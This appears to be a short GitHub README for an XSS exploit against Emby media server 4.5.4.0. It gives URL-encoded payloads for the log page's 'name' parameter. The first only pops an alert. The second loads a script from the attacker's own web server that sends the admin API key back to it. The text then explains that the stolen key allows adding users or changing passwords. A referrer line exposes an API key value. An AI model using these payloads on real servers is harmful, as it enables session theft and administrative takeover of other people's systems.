# emby-4.5.4.0-xss-poc

1.Browse emby server url :**"http://192.168.201.3:8096/web/index.html#!/log?name=embyserver.txt"** which can show you the log files.

2.Edit param "name" as **"%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e"**, urldecoded as "\<img src=x onerror=alert(1)\>"

3.Url will be **"http://192.168.201.3:8096/web/index.html#!/log?name=%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e"**

3.Browse the edited url and webpage will show an alert dialog (U may have to refresh 2-3 times).

# emby-4.5.4.0-xss-steal-admin-api-exp

1.Put emby.js in directory and run "python -m SimpleHTTPServer" to run a web server.

2.Edit param "name" as **"%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%73%63%72%69%70%74%27%29%29%2e%73%72%63%3d%27%2f%2f%31%32%37%2e%30%2e%30%2e%31%2f%65%6d%62%79%2e%6a%73%27%3e"**

3.Browse the edited url and page will load emby.js from SimpleHTTPServer and send the api value to SimpleHTTPServer.

![image](https://raw.githubusercontent.com/EstamelGG/emby-4.5.4.0-xss-exp/main/WX20210128-174426%402x.png)

4.You can use admin api to add user or change password or any thing need privilege. 

Referrer: http://swagger.emby.media/?url=http://192.168.201.3:8096/emby/openapi&api_key=902c563ed3184ff4b1492aca4a5644de#/
